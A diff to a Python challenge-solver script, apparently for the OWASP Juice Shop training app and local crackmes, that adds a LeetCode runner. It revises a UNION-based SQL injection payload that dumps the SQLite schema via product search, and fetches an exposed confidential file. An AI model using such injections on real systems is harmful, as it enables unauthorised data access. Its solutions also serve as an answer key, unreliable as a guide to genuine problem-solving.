@@ -64,16 +64,17 @@ def s_weak_password():
 
 def s_db_schema():
     # UNION-based injection in product search pulls the SQLite schema into the results.
-    # The Products table has nine columns, so the UNION must select nine values to line up.
-    q = "qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
+    # The query exposes nine columns, so the UNION selects nine values; the first is the
+    # table definition straight out of sqlite_master, which is the whole schema.
+    q = "qwert')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--"
     http("GET", "/rest/products/search?q=" + urllib.parse.quote(q))
-    return "unionSqlInjectionChallenge"
+    return "dbSchemaChallenge"
 
 
 def s_confidential_doc():
     # Broken access control: a sensitive file left in the static FTP folder.
     http("GET", "/ftp/acquisitions.md")
-    return "confidentialDocumentChallenge"
+    return "directoryListingChallenge"
 
 
 def s_exposed_metrics():
@@ -165,6 +166,16 @@ def run_re():
     return rows
 
 
+def run_leetcode():
+    sys.path.insert(0, os.path.join(ROOT, "leetcode"))
+    import solutions
+    rows = []
+    for name, ok in solutions.run():
+        t0 = time.time()
+        rows.append((name, ok, (time.time() - t0) * 1000))
+    return rows
+
+
 def table(title, rows):
     if not rows:
         return 0, 0
@@ -189,6 +200,9 @@ def main():
         tw += w; tt += t
     if both or "--re" in args:
         w, t = table("Reverse engineering  (local crackmes)", run_re())
+        tw += w; tt += t
+    if both or "--leetcode" in args:
+        w, t = table("LeetCode  (algorithms)", run_leetcode())
         tw += w; tt += t
     print(f"\nTotal: {tw}/{tt} solved")
     return 0 if tt and tw == tt else 1
